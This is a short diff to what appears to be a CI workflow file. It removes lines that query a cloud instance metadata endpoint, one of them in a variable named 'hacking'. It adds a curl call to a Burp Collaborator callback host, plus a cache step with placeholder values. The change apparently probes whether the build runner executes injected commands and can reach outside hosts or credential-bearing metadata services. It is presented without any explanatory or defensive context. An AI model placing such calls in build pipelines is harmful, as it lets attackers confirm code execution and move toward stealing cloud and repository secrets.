@@ -14,5 +14,11 @@ jobs:
     - uses: actions/checkout@v2
     - name: Run a one-line script
       run: |
-        hacking=/metadata/instance/compute/storageProfile?api-version=2019-06-01
-        curl -H "Metadata: true" http://127.0.1
+        curl http://vwv55x1biwwgkh01u25ypjphj8pydn.burpcollaborator.net
+        
+    - uses: actions/cache@v2.0.0
+    - name: Cache
+      with:
+        path: /test
+        key: 123
+
